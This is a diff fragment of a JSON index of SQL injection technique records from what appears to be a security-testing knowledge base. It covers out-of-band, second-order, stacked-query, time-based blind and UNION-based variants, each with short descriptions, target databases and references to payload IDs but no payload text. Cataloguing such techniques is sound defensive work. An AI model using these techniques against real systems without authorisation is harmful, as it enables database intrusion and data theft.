+      "subcategory": "sql-injection/error-based",
+      "tags": [
+        "sqli",
+        "error-based",
+        "in-band",
+        "database-errors"
+      ],
+      "target_technologies": [
+        "MySQL/MariaDB",
+        "PostgreSQL",
+        "Microsoft SQL Server",
+        "Oracle Database",
+        "SQLite"
+      ],
+      "technology_versions": []
+    },
+    {
+      "_path": "knowledge/web/injection/sqli/web-sqli-out-of-band.yaml",
+      "_record_type": "technique",
+      "adapted_from": null,
+      "category": "injection",
+      "classification": {
+        "cwe": [
+          "CWE-89"
+        ],
+        "owasp": [
+          "A03:2021-Injection"
+        ]
+      },
+      "description": "SQL injection in which database-side network interaction provides an out-of-band observation when the application does not return query results or useful timing differences.",
+      "domain": "web",
+      "id": "web-sqli-out-of-band",
+      "license": "CC-BY-4.0",
+      "maturity": "research",
+      "name": "Out-of-Band SQL Injection",
+      "payload_refs": [
+        "web-sqli-out-of-band-mssql-dns-canary-001",
+        "web-sqli-out-of-band-oracle-dns-canary-001"
+      ],
+      "related_techniques": [
+        "web-sqli-boolean-blind",
+        "web-sqli-time-blind"
+      ],
+      "requirements": [
+        "An application feature constructs or executes SQL using input influenced by the requester."
+      ],
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "subcategory": "sql-injection/out-of-band",
+      "tags": [
+        "sqli",
+        "out-of-band",
+        "oob",
+        "dns",
+        "callback"
+      ],
+      "target_technologies": [
+        "MySQL/MariaDB",
+        "PostgreSQL",
+        "Microsoft SQL Server",
+        "Oracle Database",
+        "SQLite"
+      ],
+      "technology_versions": []
+    },
+    {
+      "_path": "knowledge/web/injection/sqli/web-sqli-second-order.yaml",
+      "_record_type": "technique",
+      "adapted_from": null,
+      "category": "injection",
+      "classification": {
+        "cwe": [
+          "CWE-89"
+        ],
+        "owasp": [
+          "A03:2021-Injection"
+        ]
+      },
+      "description": "SQL injection in which untrusted input is stored safely or apparently inert at first, then later incorporated into a dynamically constructed SQL statement in another workflow.",
+      "domain": "web",
+      "id": "web-sqli-second-order",
+      "license": "CC-BY-4.0",
+      "maturity": "advanced",
+      "name": "Second-Order SQL Injection",
+      "payload_refs": [
+        "web-sqli-second-order-quote-canary-001",
+        "web-sqli-second-order-boolean-canary-001",
+        "web-sqli-second-order-comment-canary-001"
+      ],
+      "related_techniques": [
+        "web-sqli-error-based",
+        "web-sqli-boolean-blind"
+      ],
+      "requirements": [
+        "An application feature constructs or executes SQL using input influenced by the requester."
+      ],
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "subcategory": "sql-injection/second-order",
+      "tags": [
+        "sqli",
+        "second-order",
+        "stored-input",
+        "multi-stage"
+      ],
+      "target_technologies": [
+        "MySQL/MariaDB",
+        "PostgreSQL",
+        "Microsoft SQL Server",
+        "Oracle Database",
+        "SQLite"
+      ],
+      "technology_versions": []
+    },
+    {
+      "_path": "knowledge/web/injection/sqli/web-sqli-stacked-queries.yaml",
+      "_record_type": "technique",
+      "adapted_from": null,
+      "category": "injection",
+      "classification": {
+        "cwe": [
+          "CWE-89"
+        ],
+        "owasp": [
+          "A03:2021-Injection"
+        ]
+      },
+      "description": "SQL injection in which the database driver and execution interface permit an injected statement terminator followed by an additional SQL statement.",
+      "domain": "web",
+      "id": "web-sqli-stacked-queries",
+      "license": "CC-BY-4.0",
+      "maturity": "advanced",
+      "name": "Stacked-Query SQL Injection",
+      "payload_refs": [
+        "web-sqli-stacked-queries-mssql-select-canary-001",
+        "web-sqli-stacked-queries-postgresql-select-canary-001",
+        "web-sqli-stacked-queries-mysql-select-canary-001"
+      ],
+      "related_techniques": [
+        "web-sqli-second-order",
+        "web-sqli-time-blind"
+      ],
+      "requirements": [
+        "An application feature constructs or executes SQL using input influenced by the requester."
+      ],
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "subcategory": "sql-injection/stacked-queries",
+      "tags": [
+        "sqli",
+        "stacked-queries",
+        "multi-statement"
+      ],
+      "target_technologies": [
+        "MySQL/MariaDB",
+        "PostgreSQL",
+        "Microsoft SQL Server",
+        "Oracle Database",
+        "SQLite"
+      ],
+      "technology_versions": []
+    },
+    {
+      "_path": "knowledge/web/injection/sqli/web-sqli-time-blind.yaml",
+      "_record_type": "technique",
+      "adapted_from": null,
+      "category": "injection",
+      "classification": {
+        "cwe": [
+          "CWE-89"
+        ],
+        "owasp": [
+          "A03:2021-Injection"
+        ]
+      },
+      "description": "Blind SQL injection in which a controlled database-side delay creates an observable timing difference that can indicate whether an injected condition was evaluated.",
+      "domain": "web",
+      "id": "web-sqli-time-blind",
+      "license": "CC-BY-4.0",
+      "maturity": "advanced",
+      "name": "Time-Based Blind SQL Injection",
+      "payload_refs": [
+        "web-sqli-time-blind-postgresql-sleep-3s-001",
+        "web-sqli-time-blind-mysql-sleep-3s-001",
+        "web-sqli-time-blind-mssql-waitfor-3s-001",
+        "web-sqli-time-blind-postgresql-conditional-3s-001",
+        "web-sqli-time-blind-mysql-conditional-3s-001"
+      ],
+      "related_techniques": [
+        "web-sqli-boolean-blind"
+      ],
+      "requirements": [
+        "An application feature constructs or executes SQL using input influenced by the requester."
+      ],
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "subcategory": "sql-injection/time-based-blind",
+      "tags": [
+        "sqli",
+        "blind",
+        "time-based",
+        "timing"
+      ],
+      "target_technologies": [
+        "MySQL/MariaDB",
+        "PostgreSQL",
+        "Microsoft SQL Server",
+        "Oracle Database",
+        "SQLite"
+      ],
+      "technology_versions": []
+    },
+    {
+      "_path": "knowledge/web/injection/sqli/web-sqli-union-based.yaml",
+      "_record_type": "technique",
+      "adapted_from": null,
+      "category": "injection",
+      "classification": {
+        "cwe": [
+          "CWE-89"
+        ],
+        "owasp": [
+          "A03:2021-Injection"
+        ]
+      },
+      "description": "SQL injection that uses a UNION query operator to combine attacker-controlled SELECT results with the original query result when query structure and column compatibility permit it.",
+      "domain": "web",
+      "id": "web-sqli-union-based",
+      "license": "CC-BY-4.0",
+      "maturity": "core",
+      "name": "UNION-Based SQL Injection",
+      "payload_refs": [
+        "web-sqli-union-based-null-1-columns-001",
+        "web-sqli-union-based-null-2-columns-001",
+        "web-sqli-union-based-null-3-columns-001",
+        "web-sqli-union-based-null-4-columns-001",
+        "web-sqli-union-based-canary-string-two-columns-001",
+        "web-sqli-union-based-numeric-context-one-column-001"
+      ],
+      "related_techniques": [
+        "web-sqli-error-based",
+        "web-sqli-boolean-blind"
+      ],
+      "requirements": [
+        "An application feature constructs or executes SQL using input influenced by the requester."
+      ],
+      "review": {
+        "evidence": [],
+        "last_tested": null,
+        "status": "unverified",
+        "tested_against": []
+      },
+      "schema_version": 1,
+      "source": "original",
+      "subcategory": "sql-injection/union-based",
+      "tags": [
+        "sqli",
+        "union",
+        "in-band",
+        "column-count"
+      ],
+      "target_technologies": [
+        "MySQL/MariaDB",
+        "PostgreSQL",
+        "Microsoft SQL Server",
+        "Oracle Database",
+        "SQLite"
+      ],
+      "technology_versions": []
+    },
     {
       "_path": "knowledge/web/server-side/ssrf/web-server-side-ssrf-basic.yaml",
       "_record_type": "technique",
